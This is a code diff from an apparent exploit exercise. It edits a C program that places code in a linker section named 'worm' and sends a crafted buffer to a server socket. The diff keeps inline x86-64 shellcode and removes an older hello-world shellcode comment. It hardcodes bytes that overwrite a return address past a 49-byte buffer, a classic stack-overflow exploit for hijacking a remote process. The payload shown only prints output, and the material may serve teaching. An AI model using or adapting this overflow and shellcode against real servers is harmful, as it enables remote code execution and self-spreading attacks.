@@ -15,15 +15,9 @@ extern char __stop_worm;
 __attribute((__section__("worm")))
 
 
+
 void func(int sockfd)
 {
-	/*char s[4];
-	s[0] = 'A';
-	s[1] = 'A';
-	s[2] = 'A';
-	s[3] = 'A';
-	write(1, s, 4);
-	*/
 // CODER EN DUR LE SHELLCODE
 // AFFCIHER QQCHOSE COTE SERVEUR
 asm("push %rsi\n\t"
@@ -42,26 +36,7 @@ asm("push %rsi\n\t"
     "add $5, %rdx\n\t"
     "syscall\n\t"
 	"pop %rsi\n\t");
-/*    "code:
-    pop rsi;
-    xor rax, rax;
-    mov al, 1;
-    mov rdi, rax;
-    mov rdx, rdi;
-    add rdx, 14;
-    syscall;
 
-    xor rax, rax;
-    add rax, 60;
-    xor rdi, rdi;
-    syscall;
-	jmp short cont;
-
-    string:
-    call code;
-    db  'Hello, world!',0x0A;
-cont:
-");*/
 
 	char buff[MAX];
 	int n;
@@ -88,9 +63,9 @@ cont:
 		//while ((buff[n++] = getchar()) != '\n')
 		//	;
 		int BUF_SIZE = 49;
-		register long rsp asm ("rsp");
+		//register long rsp asm ("rsp");
 
-		buff[7+BUF_SIZE+16]= (char) ((rsp & 0xff) + 17);
+		buff[7+BUF_SIZE+16]= (char) (0xed);
 		buff[8+BUF_SIZE+16]= (char) 0xde;
 		buff[9+BUF_SIZE+16]= (char) 0xff;
 		buff[10+BUF_SIZE+16]= (char) 0xff;
